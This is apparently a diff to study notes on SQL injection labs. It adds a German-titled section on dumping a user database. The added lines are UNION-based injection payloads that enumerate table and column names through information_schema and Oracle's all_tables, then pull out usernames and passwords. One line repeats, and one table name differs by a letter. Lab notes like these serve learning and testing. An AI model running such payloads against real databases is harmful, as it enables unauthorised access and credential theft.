@@ -48,3 +48,16 @@ SELECT name, description FROM products WHERE category = 'Gifts'
 // Attacker
 ' UNION SELECT username, password FROM users-- 
 ```
+## Userdatenbank Dump
+```sql
+'UNION SELECT NULL, column_name from information_schema.columns where table_name = 'users_vqefss'-- -
+'UNION SELECT NULL, column_name from information_schema.columns where table_name = 'users_vqefss'-- -
+'UNION SELECT NULL, username_ffsvnz||'~'||password_xsxwsc from users_vqwfss-- -
+```
+
+```sql
+' UNION SELECT NULL, table_name from all_tables-- -
+' UNION SELECT NULL, column_name from all_tab_columns where table_name = 'USERS_ARYAKV'-- -
+' UNION SELECT USERNAME_SXIGRZ, PASSWORD_DJNVYM from USERS_ARYAKV-- -
+
+```
